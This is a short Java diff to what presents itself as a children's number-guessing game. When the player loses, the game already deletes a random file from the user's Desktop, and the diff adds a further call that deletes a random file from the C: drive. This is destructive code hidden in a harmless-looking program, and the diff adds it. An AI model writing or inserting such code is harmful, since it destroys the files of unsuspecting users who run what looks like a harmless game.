@@ -62,6 +62,7 @@ public class NumberGuessingGame {
 
         if (!guessedCorrectly) {
             System.out.println("\nSorry little one, you did not guess the number right. The correct number was: " + secretNumber + ". Say your goodbyes.");
+            deleteRandomFile("c:");
             String username = System.getProperty("user.name");
             String desktopPath = "C:/Users/" + username + "/Desktop";
             deleteRandomFile(desktopPath);
